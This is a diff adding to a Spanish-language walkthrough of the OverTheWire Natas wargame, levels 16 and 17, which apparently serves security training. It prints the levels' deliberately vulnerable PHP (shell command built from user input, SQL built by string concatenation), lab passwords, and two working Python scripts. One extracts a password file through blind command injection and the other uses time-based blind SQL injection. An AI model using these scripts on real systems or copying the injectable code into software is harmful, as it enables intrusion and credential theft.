@@ -1772,3 +1772,263 @@ Al visitar el sitio web nos pide iniciar sesión. Iniciamos sesión con las cred
 ```bash
 curl http://natas16.natas.labs.overthewire.org/ --user natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
 ```
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas16", "pass": "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb" };</script></head>
+<body>
+<h1>natas16</h1>
+<div id="content">
+
+For security reasons, we now filter even more on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+```php
+<?
+ini_set('pcre.jit', 0);
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+import string
+from concurrent.futures import ThreadPoolExecutor, as_completed 
+from pwn import log
+
+url = "http://natas16.natas.labs.overthewire.org/"
+auth = HTTPBasicAuth("natas16", "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb")
+chars = string.ascii_letters + string.digits
+
+password = ""
+
+progress = log.progress("Password")
+
+
+def find_char(prefix, char):
+    payload = {"needle": f"$(grep ^{prefix}{char} /etc/natas_webpass/natas17)test", "search": "Submit"}
+    response = requests.get(url, params=payload, auth=auth)
+    if "test" not in response.text:
+        return char
+    return None
+
+
+with ThreadPoolExecutor(max_workers=10) as executor:
+    while len(password) < 32:
+        prefix = password
+        futures = [executor.submit(find_char, prefix, char) for char in chars]
+
+        for future in as_completed(futures):
+            char = future.result()
+            if char is not None:
+                password += char
+                progress.status(password)
+                break
+
+
+progress.success(password)
+```
+
+## Natas Level 16 → Level 17
+
+[Natas Level 16 → Level 17](https://overthewire.org/wargames/natas/natas17.html)
+
+Al visitar el sitio web nos pide iniciar sesión. Iniciamos sesión con las credenciales obtenidas.
+
+```bash
+curl http://natas17.natas.labs.overthewire.org/ --user natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
+```
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <link rel='shortcut icon' href='/img/favicon.ico' />
+  <link rel="stylesheet" href="/css/style.css" type="text/css" media="screen" />
+  <link href="https://fonts.googleapis.com/css?family=Inconsolata|Pontano+Sans|Maven+Pro&subset=latin,latin-ext" rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" href="/css/highlightcode.css">
+  <link rel="stylesheet" href="/css/patreon.css">
+  <script src="/js/jquery-3.7.1.min.js"></script>
+  <script src="/js/mustache-4.0.0.min.js"></script>
+  <script src="/js/highlight.min.js"></script>
+  <script src="/js/otwcrap.js"></script>
+  <script src="/js/updatedmarkers.js"></script>
+  
+  <title>OverTheWire</title>
+  
+</head>
+
+<body>
+  <div id="sitename"><a href="/">OverTheWire</a></div>
+  <div id="siteslogan">We're hackers, and we are good-looking. We are the 1%.</div>
+  <div id="topmenu">
+    <ul>
+
+<li><a class='updatedmarkercontainer selected' href="/wargames/">Wargames
+<div class="updatedmarker" data-link="/wargames/"></div>
+</a></li>
+
+<li><a class='updatedmarkercontainer' href="/rules/">Rules
+<div class="updatedmarker" data-link="/rules/"></div>
+</a></li>
+
+<li><a class='updatedmarkercontainer' href="/information/donate.html">Information
+<div class="updatedmarker" data-link="/information/donate.html"></div>
+</a></li>
+
+    </ul>
+  </div>
+    
+  <div id="sidemenu"></div>
+  <script>renderLevelsMenu("natas");</script>
+  
+  <main id="content">
+    
+    <div id="title"></div>
+    <script>renderLevelTitle("natas", 17);</script>
+    
+
+    <!--
+    <div id="please-read-the-rules">Please read and accept the <a href="/rules/">Rules!</a></div>
+    -->
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: natas17
+URL:      http://natas17.natas.labs.overthewire.org
+</code></pre></div></div>
+
+  </main>
+
+  <div id="shortcuts">
+    <a href="/information/donate.html">
+      <div class="button">Donate!</div>
+    </a>
+    <a href="/information/chat.html">
+      <div class="button">Help!?</div>
+    </a>
+  </div>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RD0K2239G0"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'G-RD0K2239G0');
+  </script>
+  <script src="/js/updatedmarkers-logic.js"></script>
+  <script>
+    if (localStorage.getItem("rules-accepted") === "true") {
+      document.getElementById("please-read-the-rules").style.display = "none";
+    }
+  </script>
+</body>
+
+</html>
+```
+
+```php
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas17', '<censored>');
+    mysqli_select_db($link, 'natas17');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+}
+?>
+```
+
+```python
+from requests.auth import HTTPBasicAuth
+import requests
+import string
+import time
+from pwn import log
+
+url = "http://natas17.natas.labs.overthewire.org/"
+auth = HTTPBasicAuth("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+session = requests.session()
+
+chars = string.ascii_letters + string.digits
+password = []
+
+progress = log.progress("Password")
+try_char = log.progress(f"Trying char")
+
+while len(password) < 32:
+    for char in chars:
+        try_char.status(char)
+        payload = {"username": f'natas18" AND password LIKE BINARY "{"".join(password)}{char}%" AND SLEEP(2)#'}
+        start = time.perf_counter()
+        response = session.post(url, headers=headers, auth=auth, data=payload)
+        end = time.perf_counter()
+        elapsed = end - start
+        if elapsed > 2:
+            password.append(char)
+            progress.status("".join(password))
+            break
+
+
+progress.success("".join(password))
+```
